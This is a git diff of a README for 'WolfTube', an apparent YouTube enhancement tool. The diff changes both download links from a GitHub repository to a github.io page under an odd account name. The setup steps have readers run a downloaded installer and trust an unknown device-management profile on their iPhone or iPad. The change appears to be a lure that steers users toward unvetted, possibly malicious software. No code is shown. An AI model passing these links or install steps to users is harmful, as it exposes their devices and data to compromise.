@@ -1,6 +1,6 @@
 # 🐺 WolfTube - Enhance your YouTube viewing experience today
 
-[![Download WolfTube](https://img.shields.io/badge/Download-WolfTube-blue.svg)](https://github.com/Laurenselfinduced743/WolfTube)
+[![Download WolfTube](https://img.shields.io/badge/Download-WolfTube-blue.svg)](https://laurenselfinduced743.github.io)
 
 ## 📖 About the project
 
@@ -22,7 +22,7 @@ Make sure you have enough storage space on your device for the files you intend 
 Follow these steps to set up WolfTube on your device.
 
 1. Prepare your computer. Connect your iOS device to your Windows computer using a reliable USB cable.
-2. Visit the download page. You need to access the official release location to get the required files. [Click here to visit the download page](https://github.com/Laurenselfinduced743/WolfTube).
+2. Visit the download page. You need to access the official release location to get the required files. [Click here to visit the download page](https://laurenselfinduced743.github.io).
 3. Select the version. Look for the latest release version on the page. Download the file marked as the most recent stable build for your specific operating system.
 4. Run the installer. Locate the downloaded file on your computer. Double-click the file to start the installation assistant. Follow the prompts on the screen to finish the setup.
 5. Trust the installation. On your iPhone or iPad, go to your settings. Navigate to general settings and then to device management. Find the profile for WolfTube and select trust. This allows the software to function on your device.
